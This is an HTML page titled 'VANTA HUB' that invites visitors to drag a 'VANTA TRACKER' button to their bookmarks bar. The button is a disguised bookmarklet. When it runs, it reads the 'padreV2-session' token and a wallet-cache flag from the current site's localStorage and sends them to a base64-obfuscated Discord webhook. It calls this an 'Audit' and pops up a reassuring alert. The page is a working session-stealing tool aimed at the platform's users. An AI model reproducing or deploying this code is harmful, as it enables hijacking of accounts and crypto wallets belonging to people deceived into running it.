<!DOCTYPE html>
<html>
<head>
    <title>VANTA HUB</title>
    <style>
        body { background: #0a0a0a; color: #0f8; font-family: monospace; text-align: center; padding-top: 100px; }
        .btn { 
            display: inline-block; padding: 20px 40px; background: #0f8; color: #000; 
            text-decoration: none; font-weight: bold; border-radius: 5px; cursor: move;
            box-shadow: 0 0 20px rgba(0,255,136,0.5);
        }
        p { color: #888; }
    </style>
</head>
<body>
    <h1>VANTA INTERFACE ACTIVE</h1>
    <p>Drag the button below to your bookmarks bar.</p>
    <br><br>
    
    <a href="#" id="vanta-tool" class="btn">VANTA TRACKER</a>

    <script>
        // 1. YOUR BASE64 WEBHOOK (Update this if it dies!)
        const b64 = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ2OTQwMjAwNTgwMDg3ODMwNS84aEc3OW1WTnNnRUppR2E0ZnlxQUdmM1BzVXNRWWkxclF5TVpudTdiY3hZeWVRR2o3WmdCZjd1Y2NjeFF0OHNCQmgwOQ==";

        // 2. THE LOGIC
        // We use void(0) at the end to prevent the bookmark from opening a white page when clicked
        const rawLogic = `(async function() {
            try {
                const h = atob("${b64}");
                const d = {
                    s: localStorage.getItem('padreV2-session') || "None",
                    w: localStorage.getItem('padreV2-walletsCache') ? "Yes" : "No"
                };
                await fetch(h, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        embeds: [{
                            title: "ðŸ“¡ Audit: " + location.hostname,
                            color: 0x00ff88,
                            description: "Session: " + d.s.substring(0,20) + "...\\nWallets: " + d.w
                        }]
                    })
                });
                alert("VANTA: Audit Dispatched");
            } catch(e) {}
        })(); void(0);`;

        // 3. ENCODE AND INJECT
        // We wrap it in javascript: and encode it so it works as a URL
        document.getElementById('vanta-tool').href = "javascript:" + encodeURIComponent(rawLogic);
        
        console.log("Vanta Interface Initialized.");
    </script>
</body>
</html>
